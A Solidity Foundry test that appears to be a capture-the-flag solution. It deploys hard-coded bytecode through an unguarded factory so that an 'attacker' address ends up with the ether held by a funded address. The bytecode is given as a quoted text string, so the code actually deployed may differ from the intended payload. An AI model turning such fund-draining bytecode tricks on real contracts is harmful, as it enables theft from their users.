// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Factory {
    function dep(bytes memory _code) public payable returns (address x) {
        // require(msg.value >= 10 ether);
       
        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        if (x == address(0)) payable(msg.sender).transfer(msg.value);
    }
}

contract Lottery is Test {
   
    Factory private factory;
    address attacker;

    function setUp() public {
        factory = new Factory();
        attacker = makeAddr("attacker");
    }

    function testLottery() public {
        vm.deal(attacker, 11 ether);
        vm.deal(0x0A1EB1b2d96a175608edEF666c171d351109d8AA, 200 ether);
        vm.startPrank(attacker);
       
        //Solution
        console.log(attacker);
        bytes memory code = "0x60806040526000739df0c6b0066d5317aa5b38b36850548dacca6b4e90508073ffffffffffffffffffffffffffffffffffffffff166108fc3373ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156079573d6000803e3d6000fd5b5050603f8060886000396000f3fe6080604052600080fdfea2646970667358221220020caa0fa99d8fcf25ee19c0af6801d2c2034040b5402070cd5b0c6f76c0defd64736f6c63430008130033";
        address x = factory.dep(code);
        console.log(x);

        vm.stopPrank();
        assertGt(attacker.balance, 10 ether);
    }
}